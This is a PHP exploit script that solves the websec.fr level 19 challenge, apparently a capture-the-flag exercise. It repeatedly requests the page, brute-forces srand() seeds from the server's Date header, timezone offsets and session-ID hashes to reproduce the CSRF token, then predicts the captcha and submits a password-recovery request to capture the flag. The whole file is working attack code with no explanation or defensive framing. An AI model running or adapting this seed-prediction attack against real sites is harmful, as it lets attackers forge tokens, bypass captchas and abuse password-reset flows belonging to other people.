<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    SERVER INFO ATTACK - Using server metadata             ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

while (true) {
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    // Extraer el timestamp del header Date
    $server_timestamp = time();
    if (preg_match('/^date:\s*([^\r\n]+)/im', $response, $date_match)) {
        $server_timestamp = strtotime($date_match[1]);
    }
    
    // Extraer el Max-Age de la cookie
    $cookie_maxage = 3600; // default
    if (preg_match('/Max-Age=(\d+)/', $response, $age_match)) {
        $cookie_maxage = intval($age_match[1]);
    }
    
    echo "Token: " . substr($real_token, 0, 10) . "... | Server time: $server_timestamp\n";
    
    // Seeds basados en información del servidor
    $seeds = [];
    
    // 1. Timestamp del servidor y variaciones
    for ($offset = -3600; $offset <= 3600; $offset += 1) {
        $seeds[] = $server_timestamp + $offset;
    }
    
    // 2. Timestamp - Max-Age (momento de creación de la sesión?)
    $session_create_time = $server_timestamp - $cookie_maxage;
    for ($offset = -60; $offset <= 60; $offset++) {
        $seeds[] = $session_create_time + $offset;
    }
    
    // 3. Timestamp del servidor en diferentes zonas horarias
    $timezones = [-12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12];
    foreach ($timezones as $tz) {
        $tz_timestamp = $server_timestamp + ($tz * 3600);
        for ($offset = -10; $offset <= 10; $offset++) {
            $seeds[] = $tz_timestamp + $offset;
        }
    }
    
    // 4. Hash de la session ID
    $seeds[] = crc32($session_id);
    $seeds[] = abs(crc32($session_id));
    
    // 5. Combinaciones del timestamp y session ID
    $seeds[] = $server_timestamp ^ crc32($session_id);
    $seeds[] = $server_timestamp + crc32($session_id);
    $seeds[] = $server_timestamp - crc32($session_id);
    
    $seeds = array_unique($seeds);
    
    foreach ($seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        
        if ($test_token === $real_token) {
            echo "\n✓✓✓ MATCH! Seed: $seed ✓✓✓\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\nSUCCESS!\n";
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "FLAG: " . $flag_match[0] . "\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    exit(0);
                }
            }
            break;
        }
    }
    
    usleep(100000);
}
?>